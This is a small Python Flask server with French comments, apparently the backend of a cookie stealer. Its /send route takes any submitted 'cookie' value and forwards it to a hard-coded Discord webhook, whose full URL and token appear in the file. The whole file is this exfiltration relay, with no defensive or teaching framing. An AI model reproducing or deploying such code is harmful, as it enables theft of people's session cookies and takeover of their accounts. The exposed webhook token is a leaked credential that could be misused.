from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"  # Tu peux le mettre ici si tu veux

@app.route("/")
def home():
    return "Backend en ligne ✅"

@app.route("/send", methods=["POST"])
def send_cookie():
    data = request.json
    cookie = data.get("cookie", "")
    if cookie:
        requests.post(WEBHOOK_URL, json={"content": f"🍪 Nouveau cookie reçu : {cookie}"})
        return {"status": "ok", "message": "Cookie envoyé"}
    return {"status": "error", "message": "Aucun cookie fourni"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)